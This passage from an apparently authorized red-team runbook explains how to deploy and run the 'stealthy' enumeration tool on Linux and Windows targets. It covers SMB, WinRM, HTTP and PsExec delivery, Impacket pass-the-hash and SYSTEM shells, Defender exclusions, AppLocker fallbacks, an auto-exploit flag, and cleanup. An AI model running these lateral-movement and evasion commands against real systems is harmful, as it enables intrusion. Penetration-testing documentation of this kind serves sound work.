decrypt it, and losing the key makes the report unrecoverable.

```bash
OUT=/approved/evidence/linux-host-a.seal
KEY_OUT=/approved/keys/linux-host-a.key
STEALTHY_AUTHORIZED=1 "$BIN" --verbose \
  --output file --output-path "$OUT" --key-output-path "$KEY_OUT" \
  --also-markdown enum
```

The full key is never printed to stderr. Move `$KEY_OUT` immediately into the
approved secret store and do not leave it beside `$OUT`. Unix output/key files
use mode `0600`; Windows output/key files remove inherited ACLs and grant full
control only to the current SID. Verify the file exists, record its hash, and
confirm that the evidence log points to the key location without embedding the
key itself:

```bash
ls -l "$OUT"
sha256sum "$OUT"
```

The adjacent Markdown file is plaintext evidence and may contain sensitive
paths, usernames, or credential-related findings. Apply the same access and
retention controls as the sealed file.

### 3.11 Baseline, focused run, and comparison workflow

Use the same artifact, identity, output format, and plugin set for comparable
runs. A practical sequence is:

```bash
# Baseline: broad read-only coverage.
STEALTHY_AUTHORIZED=1 "$BIN" --quiet --format json enum > baseline.json

# Focused follow-up: only after reviewing baseline.json.
STEALTHY_AUTHORIZED=1 "$BIN" --quiet --format json \
  enum --plugins linux.sudo,linux.services > focused.json

# Offline comparison; no host access or authorization gate is required.
"$BIN" diff baseline.json focused.json --format markdown > comparison.md
```

Do not compare a broad report with a filtered report and call removed findings
remediated. A finding can disappear because the plugin was skipped, the
severity filter changed, the account changed, or the host state changed. Check
`plugins_run`, `coverage`, `identity`, `mode`, and the report timestamps before
interpreting a diff.

### 3.12 Linux run review checklist

Before leaving the host, confirm:

- The report identifies the expected hostname, user, UID, architecture, and
  elevated/non-elevated state.
- The expected Linux plugins ran, and no material plugin has `status=error`.
- The mode is `enumerate-only` unless the approved probe decision says
  otherwise.
- Any finding tagged `noisy` or `artifacts` is called out in the engagement
  log, including the observed change and cleanup result.
- Output hashes, report run ID, and key custody are recorded off-host.
- The approved drop path has been inspected before cleanup.

---

## 4. Deploy to a Windows target

### 4.0 Placeholders and drop-path choices

```bash
# Operator-side (Linux/macOS) placeholders
TARGET='user@10.0.0.30'
WIN_EXE_LOCAL='target/x86_64-pc-windows-gnu/release/stealthy.exe'
REMOTE_DIR='C:/Users/Public/Documents/cache-update'   # SCP/OpenSSH style
REMOTE_DIR_WIN='C:\Users\Public\Documents\cache-update' # native Windows style
STAGE_DIR='./drop-windows'  # output of `stealthy stage --os windows ...`
EXPECTED_SHA256='REPLACE_WITH_sha256sum_OUTPUT'
```

| Drop path | Pros | Cons |
| --- | --- | --- |
| `C:\Users\Public\Documents\...` | Usually writable for standard users; quieter than TEMP for fresh PEs | Shared; other users may see it |
| `%TEMP%\...` / `C:\Users\<you>\AppData\Local\Temp\...` | Common for tools | **Avoid for PE kits** — Defender real-time scanning often quarantines freshly copied unsigned executables here |
| `%LOCALAPPDATA%\...` | User-scoped | Persists until removed |
| Admin share `\\HOST\C$\...` | Convenient from Windows ops host | Needs admin rights; very visible in logs |

#### Lab AV / Defender posture (authorized labs)

When Defender is on and the kit PE is unsigned or newly written:

1. Stage under an approved non-`TEMP` path (for example `Public\Documents\<name>`).
2. Optionally add a **lab** path exclusion for that kit directory (`Add-MpPreference -ExclusionPath …`) when ROE and local policy allow. Automated exclusion helpers are Planned as a separate technique family — do not fold them into `endpoint-bypass`.
3. Prefer an **org-signed** PE from your normal Authenticode workflow before staging (`Get-AuthenticodeSignature` should be `Valid`). The tool does not create certificates.
4. Use `stage --name` with a bland basename when ROE wants lower static-string noise.
5. If the PE is still quarantined or missing, run the staged dispatcher (`scripts\run.ps1`) so it can walk `windows_fallbacks` (python → pwsh → powershell → git → jscript → msbuild). `script_first=auto` already skips the PE when a live EDR sensor is observed (MDE Sense / third-party; not inbox Defender AV alone). Stronger interference (quarantine restore, service stop) is Planned under separate gated families — see `docs/techniques.md`.

The operator-facing catalog of every method is [Get the kit onto a host](runbook/delivery.md). Prefer copying the **staged bundle** (section 1.7) rather than a lone `stealthy.exe`. Do not run `install.ps1` on the target.

**Preferred: OpenSSH copy of the staged bundle** (from Linux/macOS):

```bash
ssh "$TARGET" "powershell -NoProfile -Command \"New-Item -ItemType Directory -Force -Path '$REMOTE_DIR_WIN' | Out-Null\""
scp -r "$STAGE_DIR"/. "$TARGET:$REMOTE_DIR/"
ssh "$TARGET" "powershell -NoProfile -Command \"Get-FileHash '$REMOTE_DIR_WIN\\cache-update.exe' -Algorithm SHA256\""
```

**Preferred: WinRM session copy of the staged bundle** (from a Windows operator box; no `C$` required):

```powershell
$RemoteDir = 'C:\Users\Public\Documents\cache-update'
$s = New-PSSession -ComputerName TARGET -Credential (Get-Credential)
Invoke-Command -Session $s -ScriptBlock {
  param($Dir)
  New-Item -ItemType Directory -Force -Path $Dir | Out-Null
} -ArgumentList $RemoteDir
Copy-Item -ToSession $s -Path .\drop-windows\* -Destination $RemoteDir -Recurse -Force
Invoke-Command -Session $s -ScriptBlock {
  param($Dir)
  Get-FileHash (Join-Path $Dir 'cache-update.exe') -Algorithm SHA256
} -ArgumentList $RemoteDir
Remove-PSSession $s
```

If the PE is quarantined or blocked after copy, do not retry that hash. Use
`scripts\run.ps1` (section 4.10 / 5.5).

**Method chooser**

| Situation | Prefer |
| --- | --- |
| Staged bundle over OpenSSH (default from Linux) | Copy `$STAGE_DIR/.` as above, then 4.11 |
| Staged bundle over WinRM (default from Windows) | `Copy-Item -ToSession` as above, then 4.11 |
| Windows OpenSSH, single PE | 4.1 SCP / SSH pipe |
| Domain admin workstation + admin share | 4.2 SMB / `Copy-Item` / `net use` |
| WinRM, single PE or `-FilePath` script | 4.3 PowerShell remoting |
| Target can reach operator HTTP | 4.4 `Invoke-WebRequest` / `curl.exe` / BITS |
| RDP session | 4.5 drive redirect / clipboard / TS client share |
| Need remote service create / interactive cmd (high noise) | 4.6 PsExec-style |
| Impacket / remote Windows tooling on Linux | 4.7 smbclient.py / evil-winrm / psexec.py |
| Text-only channel | 4.8 certutil / FromBase64String |
| Existing FTP / WebDAV | 4.9 |
| Custom `.exe` blocked (AppLocker/WDAC/AV) | 4.10 script-only |
| Need integrity check | 4.11 verify |

### 4.1 SCP / OpenSSH on Windows

From Linux/macOS:

```bash
ssh "$TARGET" "powershell -NoProfile -Command \"New-Item -ItemType Directory -Force -Path '$REMOTE_DIR_WIN' | Out-Null\""
scp "$WIN_EXE_LOCAL" "$TARGET:$REMOTE_DIR/stealthy.exe"
scp scripts/windows/enum.py scripts/windows/enum.ps1 scripts/windows/enum-git.sh \
  scripts/windows/enum.js scripts/windows/EnumTasks.csproj \
  "$TARGET:$REMOTE_DIR/"
ssh "$TARGET" "powershell -NoProfile -Command \"& '$REMOTE_DIR_WIN\\stealthy.exe' --help\""
```

SSH + PowerShell decode from stdin (when `scp` is unavailable):

```bash
ssh "$TARGET" "powershell -NoProfile -Command \"New-Item -ItemType Directory -Force -Path '$REMOTE_DIR_WIN' | Out-Null\""
# Stream base64 on stdin; decode on target (avoids argv length limits)
base64 -w0 "$WIN_EXE_LOCAL" | ssh "$TARGET" "powershell -NoProfile -Command \"\$d=[Console]::In.ReadToEnd(); [IO.File]::WriteAllBytes('$REMOTE_DIR_WIN\\stealthy.exe',[Convert]::FromBase64String(\$d.Trim()))\""
```

For multi-megabyte drops, prefer `scp` / SMB / HTTP (4.1–4.4) over stdin encoding.

Zip bundle:

```bash
scp stealthy-windows-x64.zip "$TARGET:C:/Users/Public/Documents/"
ssh "$TARGET" 'powershell -NoProfile -Command "Expand-Archive -Force -Path C:\Users\Public\Documents\stealthy-windows-x64.zip -DestinationPath C:\Users\Public\Documents\cache-update"'
```

### 4.2 SMB admin share / mapped drive

From a **Windows** operator workstation:

```powershell
$HostName = 'TARGET'
$Dir = "\\$HostName\C$\Users\Public\Documents\cache-update"
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
Copy-Item .\target\release\stealthy.exe "$Dir\stealthy.exe" -Force
Copy-Item .\scripts\windows\* $Dir -Force
Get-FileHash "$Dir\stealthy.exe" -Algorithm SHA256
```

`net use` + `copy`:

```cmd
net use Z: \\TARGET\C$ /user:DOMAIN\user *
mkdir Z:\Users\Public\Documents\cache-update
copy /Y stealthy.exe Z:\Users\Public\Documents\cache-update\stealthy.exe
copy /Y scripts\windows\* Z:\Users\Public\Documents\cache-update\
net use Z: /delete
```

From Linux with `smbclient`:

```bash
smbclient '//TARGET/C$' -U 'DOMAIN/user' -c \
  'mkdir Users\Public\Documents\cache-update; \
   put target/x86_64-pc-windows-gnu/release/stealthy.exe Users\Public\Documents\cache-update\stealthy.exe; \
   put scripts/windows/enum.ps1 Users\Public\Documents\cache-update\enum.ps1; \
   put scripts/windows/enum.js Users\Public\Documents\cache-update\enum.js'
```

Non-admin user share (if one exists):

```powershell
$Dir = '\\TARGET\ShareName\engagement\cache-update'
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
Copy-Item .\stealthy.exe "$Dir\stealthy.exe" -Force
```

### 4.3 WinRM / PowerShell remoting

Enable only if already in ROE / already configured:

```powershell
$S = New-PSSession -ComputerName TARGET -Credential (Get-Credential)
Invoke-Command -Session $S -ScriptBlock {
  New-Item -ItemType Directory -Force -Path 'C:\Users\Public\Documents\cache-update' | Out-Null
}
Copy-Item -ToSession $S -Path .\target\release\stealthy.exe \
  -Destination 'C:\Users\Public\Documents\cache-update\stealthy.exe' -Force
Copy-Item -ToSession $S -Path .\scripts\windows\* \
  -Destination 'C:\Users\Public\Documents\cache-update\' -Force
Invoke-Command -Session $S -ScriptBlock {
  & 'C:\Users\Public\Documents\cache-update\stealthy.exe' --help
}
Remove-PSSession $S
```

One-shot without keeping a session object:

```powershell
$Cred = Get-Credential
Copy-Item -Path .\stealthy.exe -Destination '\\TARGET\C$\Users\Public\Documents\cache-update\stealthy.exe' -Force
Invoke-Command -ComputerName TARGET -Credential $Cred -ScriptBlock {
  $env:STEALTHY_AUTHORIZED = '1'
  & 'C:\Users\Public\Documents\cache-update\stealthy.exe' -q enum
}
```

### 4.4 HTTP(S) / BITS / curl pull on target

Operator hosts the Windows bundle (approved channel only):

```bash
cd release-staging && python3 -m http.server 8000 --bind 10.8.0.1
```

PowerShell download:

```powershell
$Dir = 'C:\Users\Public\Documents\cache-update'
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
$Url = 'http://OPERATOR:8000/stealthy-windows-x64/stealthy.exe'
Invoke-WebRequest -Uri $Url -OutFile "$Dir\stealthy.exe" -UseBasicParsing
# Legacy:
# (New-Object Net.WebClient).DownloadFile($Url, "$Dir\stealthy.exe")
Get-FileHash "$Dir\stealthy.exe" -Algorithm SHA256
& "$Dir\stealthy.exe" --help
```

`curl.exe` (Windows 10+):

```powershell
curl.exe -fsSL -o "$Dir\stealthy.exe" $Url
```

BITS (often less “browser-like”; still logged):

```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source $Url -Destination "$Dir\stealthy.exe"
```

Zip pull + expand:

```powershell
$Zip = "$Dir\bundle.zip"
Invoke-WebRequest -Uri 'http://OPERATOR:8000/stealthy-windows-x64.zip' -OutFile $Zip -UseBasicParsing
Expand-Archive -Force -Path $Zip -DestinationPath $Dir
```

**Note:** `certutil -urlcache -split -f http://...` works on many hosts but is a well-known living-off-the-land download pattern and is frequently alerted — prefer `Invoke-WebRequest` / `curl.exe` / BITS when available.

### 4.5 RDP clipboard, drive redirect, and `\\tsclient`

1. Enable clipboard **or** local drive redirection in the RDP client (per ROE).
2. Copy `stealthy.exe` / zip into the redirected path.

From an RDP desktop session on the target:

```cmd
dir \\tsclient\C\path\to\stealthy.exe
mkdir C:\Users\Public\Documents\cache-update
copy /Y \\tsclient\C\path\to\stealthy.exe C:\Users\Public\Documents\cache-update\stealthy.exe
copy /Y \\tsclient\C\path\to\scripts\windows\* C:\Users\Public\Documents\cache-update\
```

PowerShell:

```powershell
Copy-Item '\\tsclient\C\path\to\stealthy.exe' 'C:\Users\Public\Documents\cache-update\stealthy.exe' -Force
```

Clipboard paste works for scripts (`enum.ps1` / `enum.js`) more reliably than large PE files.

### 4.6 PsExec-style remote create

**Risk:** High-signal on modern EDR/AV. Creates a remote service (often `PSEXESVC`), may drop a helper binary under `ADMIN$` / `%SystemRoot%`, and generates conspicuous 7045/4697 service events. Use only when ROE explicitly allows remote service execution and quieter paths (SSH/WinRM/SMB copy + local run) are unavailable or insufficient.

Never place a real password, token, or hash in a shell command, ticket, or
transcript. The credentials below are placeholders only. Use an approved
prompt, credential manager, or operator-side secret injection mechanism, and
record the credential source—not the secret—in the engagement log.

Prerequisites:

- Admin credentials (local admin or equivalent) on the target
- SMB access to `ADMIN$` / `C$` (TCP 445) and the ability to create/start services
- Operator binary available: Sysinternals `PsExec64.exe`, compatible `PAExec.exe`, or Impacket `psexec.py` (section also covers close cousins)

#### 4.6.1 Stage the payload first (recommended)

Prefer copying `stealthy.exe` (or scripts) via SMB, then using PsExec only to **execute** — fewer surprises than asking PsExec to both copy and run:

```powershell
$Target = 'TARGET'
$Dir = "\\$Target\C$\Users\Public\Documents\cache-update"
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
Copy-Item .\target\release\stealthy.exe "$Dir\stealthy.exe" -Force
Copy-Item .\scripts\windows\enum.ps1 "$Dir\enum.ps1" -Force
```

#### 4.6.2 Sysinternals PsExec — remote execute

```cmd
set TARGET=TARGET
set USER=DOMAIN\user
set BIN=C:\Users\Public\Documents\cache-update\stealthy.exe

:: Accept EULA once in lab tooling images if required
psexec64.exe \\%TARGET% -u %USER% -p PASSWORD -accepteula -h cmd /c "set STEALTHY_AUTHORIZED=1&& \"%BIN%\" -q enum"

:: Interactive remote shell (very noisy)
psexec64.exe \\%TARGET% -u %USER% -p PASSWORD -accepteula -h cmd.exe

:: Run as SYSTEM
psexec64.exe \\%TARGET% -u %USER% -p PASSWORD -accepteula -s -h cmd /c "set STEALTHY_AUTHORIZED=1&& \"%BIN%\" -q enum"

:: Copy+run in one shot (drops binary via ADMIN$; noisier)
psexec64.exe \\%TARGET% -u %USER% -p PASSWORD -accepteula -h -c -f .\stealthy.exe --i-understand-authorized-use-only -q enum
```

PowerShell wrapper:

```powershell
$Target = 'TARGET'
$User = 'DOMAIN\user'
$Pass = 'PASSWORD'   # prefer credential store / prompt in real ops
$RemoteBin = 'C:\Users\Public\Documents\cache-update\stealthy.exe'
& .\PsExec64.exe "\\$Target" -u $User -p $Pass -accepteula -h `
  cmd /c "set STEALTHY_AUTHORIZED=1&& `"$RemoteBin`" -q enum"
```

Script-only via PsExec when PE is blocked but `powershell.exe` is allowed:

```cmd
psexec64.exe \\TARGET -u DOMAIN\user -p PASSWORD -accepteula -h ^
  powershell -NoProfile -ExecutionPolicy Bypass -File C:\Users\Public\Documents\cache-update\enum.ps1 -Authorized
```

Useful flags (operator reminder):

| Flag | Meaning |
| --- | --- |
| `-h` | Elevated token if available |
| `-s` | Run as SYSTEM |
| `-c -f` | Copy local binary to target and overwrite |
| `-d` | Do not wait for process to finish |
| `-i` | Interact with a desktop session (session id optional) |

#### 4.6.3 PAExec (PsExec-compatible alternative)

```cmd
paexec.exe \\TARGET -u DOMAIN\user -p PASSWORD -h ^
  cmd /c "set STEALTHY_AUTHORIZED=1&& C:\Users\Public\Documents\cache-update\stealthy.exe -q enum"

:: copy+run
paexec.exe \\TARGET -u DOMAIN\user -p PASSWORD -h -c -f stealthy.exe --i-understand-authorized-use-only -q enum
```

#### 4.6.4 Impacket `psexec.py` / `smbexec.py` / `wmiexec.py`

From a Linux operator host (authorized tooling path only):

```bash
# Classic PsExec-like remote service + shell
psexec.py 'DOMAIN/user:PASSWORD@TARGET'

# After you already staged stealthy.exe via smbclient.py / ADMIN$:
psexec.py 'DOMAIN/user:PASSWORD@TARGET' \
  'cmd.exe /c set STEALTHY_AUTHORIZED=1&& C:\Users\Public\Documents\cache-update\stealthy.exe -q enum'

# Pass-the-hash form (when ROE allows)
psexec.py -hashes 'LMHASH:NTHASH' 'DOMAIN/user@TARGET' \
  'cmd.exe /c set STEALTHY_AUTHORIZED=1&& C:\Users\Public\Documents\cache-update\stealthy.exe -q enum'
```

Semi-interactive alternatives that still create remote execution artifacts (choose per controls):

```bash
# Service-based, less file drop than classic psexec in some setups — still noisy
smbexec.py 'DOMAIN/user:PASSWORD@TARGET'

# WMI-based remote process create (no PSEXESVC; still high-signal)
wmiexec.py 'DOMAIN/user:PASSWORD@TARGET' \
  'cmd.exe /c set STEALTHY_AUTHORIZED=1&& C:\Users\Public\Documents\cache-update\stealthy.exe -q enum'

# WinRM-based (often quieter than PsExec when WinRM is expected admin traffic)
atexec.py 'DOMAIN/user:PASSWORD@TARGET' \
  'cmd.exe /c set STEALTHY_AUTHORIZED=1&& C:\Users\Public\Documents\cache-update\stealthy.exe --output file --output-path C:\Users\Public\Documents\cache-update\findings.seal --key-output-path C:\Users\Public\Documents\cache-update\findings.key -q enum'
```

#### 4.6.5 Cleanup after PsExec-style runs

On the target (admin):

```cmd
:: Stop/remove leftover service if present (name may vary)
sc stop PSEXESVC
sc delete PSEXESVC
del /f /q C:\Windows\PSEXESVC.exe
del /f /q C:\Users\Public\Documents\cache-update\stealthy.exe
del /f /q C:\Users\Public\Documents\cache-update\findings.seal
```

```powershell
Get-Service PSEXESVC -ErrorAction SilentlyContinue | Stop-Service -Force
sc.exe delete PSEXESVC
Remove-Item -Force -ErrorAction SilentlyContinue C:\Windows\PSEXESVC.exe
Remove-Item -Force -ErrorAction SilentlyContinue C:\Users\Public\Documents\cache-update\stealthy.exe
```

Document service creation/deletion timestamps in the engagement log — defenders will see them either way.

### 4.7 Linux-operator Windows tooling (Impacket / Evil-WinRM)

Impacket smbclient-style upload:

```bash
# example tooling name — use your approved package path
smbclient.py 'DOMAIN/user:PASSWORD@TARGET' <<'EOF'
use C$
mkdir Users\Public\Documents\cache-update
put target/x86_64-pc-windows-gnu/release/stealthy.exe Users\Public\Documents\cache-update\stealthy.exe
put scripts/windows/enum.ps1 Users\Public\Documents\cache-update\enum.ps1
ls Users\Public\Documents\cache-update
exit
EOF
```

Evil-WinRM:

```bash
evil-winrm -i TARGET -u user -p 'PASSWORD'
# inside the shell:
# upload target/x86_64-pc-windows-gnu/release/stealthy.exe C:\Users\Public\Documents\cache-update\stealthy.exe
# upload scripts/windows/enum.ps1 C:\Users\Public\Documents\cache-update\enum.ps1
```

For PsExec-like remote create from Impacket, use section **4.6.4**.

### 4.8 Base64 / certutil / PowerShell decode

Build host:

```bash
base64 -w0 target/x86_64-pc-windows-gnu/release/stealthy.exe > /tmp/stealthy.exe.b64
split -b 500k /tmp/stealthy.exe.b64 /tmp/stealthy.exe.b64.part.
```

Transfer the `.b64` (or parts) as text, then on Windows:

```cmd
certutil -decode C:\Users\Public\Documents\stealthy.exe.b64 C:\Users\Public\Documents\cache-update\stealthy.exe
C:\Users\Public\Documents\cache-update\stealthy.exe --help
```

PowerShell reassembling parts + decode:

```powershell
$Dir = 'C:\Users\Public\Documents\cache-update'
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
Get-Content .\stealthy.exe.b64.part.* | Set-Content -Encoding ascii .\stealthy.exe.b64
$bytes = [Convert]::FromBase64String((Get-Content -Raw .\stealthy.exe.b64))
[IO.File]::WriteAllBytes("$Dir\stealthy.exe", $bytes)
Get-FileHash "$Dir\stealthy.exe" -Algorithm SHA256
```

### 4.9 FTP / WebDAV (only if already approved infrastructure)

```powershell
# FTP example using curl.exe
curl.exe -u user:pass ftp://FILES/stealthy.exe -o "$Dir\stealthy.exe"

# WebDAV mapped folder then copy
net use W: https://files.example/dav /user:user *
copy /Y W:\engagement\stealthy.exe C:\Users\Public\Documents\cache-update\stealthy.exe
```

### 4.10 Script-only deploy (custom `.exe` blocked)

Drop scripts without the PE. `enum.ps1` / `enum.js` inventory AppLocker, WDAC/CI,
SmartScreen, and AMSI signals. Those enumeration fallbacks do not disable
controls; `endpoint-bypass` stays alternate-path / approved-fixture only.
Gated AMSI/ETW/AV-EDR interference belongs under the evasion IDs (see
`docs/techniques.md` and `docs/evasion.md`).

```powershell
$Dir = 'C:\Users\Public\Documents\cache-update'
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
# After copying enum.py / enum.ps1 / enum-git.sh / enum.js / EnumTasks.csproj into $Dir:
python.exe "$Dir\enum.py" --authorized
powershell -NoProfile -File "$Dir\enum.ps1" -Authorized
cscript //nologo "$Dir\enum.js" --authorized
```

When the PE *can* run, still collect control inventory:

```powershell
& $Bin --authorized enum --plugins windows.endpoint_controls
```

From operator host over SSH:

```bash
ssh "$TARGET" "powershell -NoProfile -Command \"New-Item -ItemType Directory -Force -Path '$REMOTE_DIR_WIN' | Out-Null\""
scp scripts/windows/enum.py scripts/windows/enum.ps1 scripts/windows/enum-git.sh \
  scripts/windows/enum.js scripts/windows/EnumTasks.csproj \
  "$TARGET:$REMOTE_DIR/"
ssh "$TARGET" 'powershell -NoProfile -ExecutionPolicy Bypass -File C:\Users\Public\Documents\cache-update\enum.ps1 -Authorized'
ssh "$TARGET" 'cscript //nologo C:\Users\Public\Documents\cache-update\enum.js --authorized'
```

WinRM script push without writing `enum.ps1` first:

```powershell
$S = New-PSSession -ComputerName TARGET -Credential (Get-Credential)
Invoke-Command -Session $S -FilePath .\scripts\windows\enum.ps1 -ArgumentList '-Authorized'
Remove-PSSession $S
```

Encoded command for tiny checks (prefer files for the full script; keep encoding for last-resort):

```powershell
$cmd = Get-Content -Raw .\scripts\windows\enum.ps1
$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
$env:STEALTHY_AUTHORIZED = '1'
powershell -NoProfile -EncodedCommand $b64
```

MSBuild stub (allowlisted toolchain path; documentation/host helper only):

```cmd
where msbuild
msbuild C:\Users\Public\Documents\cache-update\EnumTasks.csproj
```

If AppLocker blocks `powershell.exe` but allows `cscript.exe`, use `enum.js`. If both are blocked, escalate within ROE or use `--allow-techniques endpoint-bypass` only when approved (alternate-path + approved-fixture validation). Control interference is not part of `endpoint-bypass`; use evasion-family IDs with `--confirm-evasion` when ROE permits (see `docs/techniques.md` and `docs/evasion.md`).

### 4.11 Post-deploy verify (Windows)

```powershell
$Bin = 'C:\Users\Public\Documents\cache-update\stealthy.exe'
Get-Item $Bin | Format-List FullName, Length, LastWriteTime
Get-FileHash $Bin -Algorithm SHA256
& $Bin --help
& $Bin disclaimer
```

From Linux operator after SCP:

```bash
ssh "$TARGET" 'powershell -NoProfile -Command "Get-FileHash C:\Users\Public\Documents\cache-update\stealthy.exe -Algorithm SHA256"'
sha256sum "$WIN_EXE_LOCAL"
```

SmartScreen / AppLocker quick triage:

```powershell
# If execution is blocked, capture the message and switch to 4.10 script-only
& $Bin --help
if (-not $?) { Write-Host 'PE blocked — use run.ps1 (python/pwsh/powershell/git/jscript/msbuild)' }
```

---

## 5. Run on a Windows target

### 5.1 cmd.exe

```cmd
set BIN=C:\Users\Public\Documents\cache-update\stealthy.exe
set STEALTHY_AUTHORIZED=1
"%BIN%" disclaimer
"%BIN%" list-plugins
"%BIN%" enum
```

Explicit flag form:

```cmd
C:\Users\Public\Documents\cache-update\stealthy.exe --i-understand-authorized-use-only enum
```

### 5.2 PowerShell

```powershell
$Bin = 'C:\Users\Public\Documents\cache-update\stealthy.exe'
$env:STEALTHY_AUTHORIZED = '1'
& $Bin disclaimer
& $Bin list-plugins
& $Bin enum
& $Bin -q enum --plugins windows.privileges,windows.services,windows.always_install_elevated
```

### 5.3 Sealed / plaintext output

```powershell
$Bin = 'C:\Users\Public\Documents\cache-update\stealthy.exe'
$env:STEALTHY_AUTHORIZED = '1'
# The full key is never emitted to stderr. The protected key file removes
# inherited ACLs and grants full control only to the current SID.
& $Bin --verbose --output file `
  --output-path 'C:\Users\Public\Documents\cache-update\findings.seal' `
  --key-output-path 'C:\Users\Public\Documents\cache-update\findings.key' enum
& $Bin --output file --output-path 'C:\Users\Public\Documents\cache-update\findings.json' --plaintext-file enum
```

### 5.4 Limited auto-exploit

```powershell
$env:STEALTHY_AUTHORIZED = '1'
& $Bin enum --auto-exploit
```

### 5.5 Script fallbacks

Prefer the staged dispatcher, which walks `python → pwsh → powershell → git → jscript → msbuild` when
the PE is blocked. Script tiers are reduced coverage; only auth and `--json` /
`-Json` are forwarded from the binary CLI.

```powershell
& .\drop\scripts\run.ps1 --authorized --profile balanced enum
```

Direct scripts (troubleshooting only):

```powershell
python.exe .\enum.py --authorized --json
pwsh -NoProfile -File .\enum.ps1 -Authorized | Tee-Object -FilePath .\enum-ps.txt
powershell -NoProfile -ExecutionPolicy Bypass -File .\enum.ps1 -Authorized | Tee-Object -FilePath .\enum-ps51.txt
cscript //nologo .\enum.js --authorized > .\enum-js.txt
msbuild .\EnumTasks.csproj /nologo /v:minimal
```

### 5.6 Windows cleanup

```powershell
$Dir = 'C:\Users\Public\Documents\cache-update'
Remove-Item -Force -ErrorAction SilentlyContinue @(
  "$Dir\stealthy.exe",
  "$Dir\findings.seal",
  "$Dir\findings.json",
  "$Dir\enum.ps1",
  "$Dir\enum.js",
  "$Dir\EnumTasks.csproj"
)
Remove-Item -Recurse -Force -ErrorAction SilentlyContinue $Dir
```

```cmd
del /f /q C:\Users\Public\Documents\cache-update\stealthy.exe
del /f /q C:\Users\Public\Documents\cache-update\findings.*
rmdir /s /q C:\Users\Public\Documents\cache-update
```

### 5.7 Capture and validate a Windows baseline

PowerShell progress and diagnostics can make redirected output hard to audit.
Use quiet machine output for JSON and retain a separate transcript only when
the evidence policy permits it.

```powershell
$ErrorActionPreference = 'Stop'
$Bin = 'C:\Users\Public\Documents\cache-update\stealthy.exe'
$Stamp = (Get-Date).ToUniversalTime().ToString('yyyyMMddTHHmmssZ')
$Json = "C:\Users\Public\Documents\cache-update\windows-$Stamp.json"
$Err  = "C:\Users\Public\Documents\cache-update\windows-$Stamp.stderr.txt"
$env:STEALTHY_AUTHORIZED = '1'

& $Bin --quiet --no-color --format json --output memory enum `
  1> $Json 2> $Err

Get-Content -Raw $Json | ConvertFrom-Json | Out-Null
Get-FileHash $Json -Algorithm SHA256
```

Keep the exit code from the process in the run log. If using `--fail-on`,
exit `4` is a finding gate, not necessarily a tool failure. Inspect the JSON
`coverage` entries and confirm that the expected Windows plugin set ran.

### 5.8 Windows sealed output and key handling

The same key-custody rule applies on Windows: write the key to a distinct
protected path, place it in the approved secret store, and remove the target
copy after transfer. The full key is never printed to stderr.

```powershell
$Bin = 'C:\Users\Public\Documents\cache-update\stealthy.exe'
$Out = 'C:\Users\Public\Documents\cache-update\findings.seal'
$KeyOut = 'C:\Users\Public\Documents\cache-update\findings.key'
$env:STEALTHY_AUTHORIZED = '1'
& $Bin --verbose --output file --output-path $Out `
  --key-output-path $KeyOut --also-markdown enum

Get-Item $Out | Select-Object FullName, Length, LastWriteTime
Get-FileHash $Out -Algorithm SHA256
```

The tool removes inherited ACL entries and grants full control only to the
current SID. Still move `$KeyOut` to the approved secret store promptly and
confirm the target copy was removed after transfer.

### 5.9 Windows run review checklist

Before cleanup, confirm:

- The report identifies the expected computer, account, architecture, and
  token/elevation context.
- The expected Windows plugins ran and material coverage errors are explained.
- SmartScreen, AppLocker, WDAC, AMSI, or EDR signals are recorded via
  `windows.endpoint_controls` or script fallbacks; use approved script paths
  when the PE is blocked. `--allow-techniques endpoint-bypass` means
  alternate-path + approved-fixture validation only. AMSI/ETW/AV-EDR
  interference uses evasion IDs with `--confirm-evasion`; see
  `docs/techniques.md` and `docs/evasion.md`.
- Any service, task, registry, or file write is attributable to an approved
  action and has a recorded rollback or cleanup result.
- The sealed-file hash, report run ID, and key custody are recorded off-host.
- The exact approved drop directory has been inspected before removal.

---

## 6. Common operator recipes

### 6.1 Linux: build, push, enum, pull sealed results

```bash
set -euo pipefail
TARGET='user@10.0.0.20'
REMOTE='/tmp/.cache-update'
RUN_UTC=$(date -u +%Y%m%dT%H%M%SZ)
cargo build -p stealthy --release
ssh "$TARGET" "mkdir -p $REMOTE"
scp target/release/stealthy "$TARGET:$REMOTE/stealthy"
ssh "$TARGET" "chmod +x $REMOTE/stealthy && STEALTHY_AUTHORIZED=1 $REMOTE/stealthy --verbose --output file --output-path $REMOTE/findings.seal --key-output-path $REMOTE/findings.key enum"
scp "$TARGET:$REMOTE/findings.seal" ./findings-$(date +%Y%m%d%H%M%S).seal
scp "$TARGET:$REMOTE/findings.key" "/approved/keys/linux-${RUN_UTC}.key"
# Move the key into the approved secret store before sharing or archiving.
ssh "$TARGET" "rm -f $REMOTE/stealthy $REMOTE/findings.seal $REMOTE/findings.key"
```

### 6.2 Windows: cross-build, SCP, enum, pull sealed results

```bash
set -euo pipefail
TARGET='user@10.0.0.30'
REMOTE='C:/Users/Public/Documents/cache-update'
RUN_UTC=$(date -u +%Y%m%dT%H%M%SZ)
rustup target add x86_64-pc-windows-gnu
cargo build -p stealthy --release --target x86_64-pc-windows-gnu
ssh "$TARGET" "powershell -NoProfile -Command \"New-Item -ItemType Directory -Force -Path 'C:\\Users\\Public\\Documents\\cache-update' | Out-Null\""
scp target/x86_64-pc-windows-gnu/release/stealthy.exe "$TARGET:$REMOTE/stealthy.exe"
ssh "$TARGET" 'set STEALTHY_AUTHORIZED=1&& C:\Users\Public\Documents\cache-update\stealthy.exe --verbose --output file --output-path C:\Users\Public\Documents\cache-update\findings.seal --key-output-path C:\Users\Public\Documents\cache-update\findings.key enum'
scp "$TARGET:$REMOTE/findings.seal" ./findings-win-$(date +%Y%m%d%H%M%S).seal
scp "$TARGET:$REMOTE/findings.key" "/approved/keys/windows-${RUN_UTC}.key"
# Move the key into the approved secret store before sharing or archiving.
ssh "$TARGET" 'del /f /q C:\Users\Public\Documents\cache-update\stealthy.exe C:\Users\Public\Documents\cache-update\findings.seal C:\Users\Public\Documents\cache-update\findings.key'
```

### 6.3 Linux script-only one-shot over SSH

```bash
